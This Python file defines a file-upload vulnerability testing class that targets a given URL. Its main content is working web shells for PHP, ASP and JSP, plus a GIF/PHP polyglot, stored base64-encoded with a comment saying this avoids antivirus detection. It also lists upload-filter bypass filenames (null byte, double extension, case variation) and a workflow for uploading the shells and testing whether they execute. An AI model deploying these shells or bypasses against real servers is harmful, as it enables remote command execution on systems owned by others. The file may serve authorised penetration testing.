from typing import Dict, Any
import base64

class FileUploadTestingFramework:
    """Specialized framework for file upload vulnerability testing"""

    def __init__(self):
        self.malicious_extensions = [
            ".php", ".php3", ".php4", ".php5", ".phtml", ".pht",
            ".asp", ".aspx", ".jsp", ".jspx",
            ".py", ".rb", ".pl", ".cgi",
            ".sh", ".bat", ".cmd", ".exe"
        ]

        self.bypass_techniques = [
            "double_extension",
            "null_byte",
            "content_type_spoofing",
            "magic_bytes",
            "case_variation",
            "special_characters"
        ]

    def generate_test_files(self) -> Dict[str, Any]:
        """Generate various test files for upload testing"""
        # Base64 encoded payloads to avoid AV detection during development
        php_shell = "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
        asp_shell = "PCVldmFsIHJlcXVlc3QoImNtZCIpJT4="
        jsp_shell = "PCVSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSk7JT4="
        polyglot = "R0lGODlhPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"

        test_files = {
            "web_shells": [
                {"name": "simple_php_shell.php", "content": base64.b64decode(php_shell).decode('utf-8', errors='ignore')},
                {"name": "asp_shell.asp", "content": base64.b64decode(asp_shell).decode('utf-8', errors='ignore')},
                {"name": "jsp_shell.jsp", "content": base64.b64decode(jsp_shell).decode('utf-8', errors='ignore')}
            ],
            "bypass_files": [
                {"name": "shell.php.txt", "technique": "double_extension"},
                {"name": "shell.php%00.txt", "technique": "null_byte"},
                {"name": "shell.PhP", "technique": "case_variation"},
                {"name": "shell.php.", "technique": "trailing_dot"}
            ],
            "polyglot_files": [
                {"name": "polyglot.jpg", "content": base64.b64decode(polyglot).decode('utf-8', errors='ignore'), "technique": "image_polyglot"}
            ]
        }

        return test_files

    def create_upload_testing_workflow(self, target_url: str) -> Dict[str, Any]:
        """Create comprehensive file upload testing workflow"""
        workflow = {
            "target": target_url,
            "test_phases": [
                {
                    "name": "reconnaissance",
                    "description": "Identify upload endpoints",
                    "tools": ["katana", "gau", "paramspider"],
                    "expected_findings": ["upload_forms", "api_endpoints"]
                },
                {
                    "name": "baseline_testing",
                    "description": "Test legitimate file uploads",
                    "test_files": ["image.jpg", "document.pdf", "text.txt"],
                    "observations": ["response_codes", "file_locations", "naming_conventions"]
                },
                {
                    "name": "malicious_upload_testing",
                    "description": "Test malicious file uploads",
                    "test_files": self.generate_test_files(),
                    "bypass_techniques": self.bypass_techniques
                },
                {
                    "name": "post_upload_verification",
                    "description": "Verify uploaded files and test execution",
                    "actions": ["file_access_test", "execution_test", "path_traversal_test"]
                }
            ],
            "estimated_time": 360,
            "risk_level": "high"
        }

        return workflow
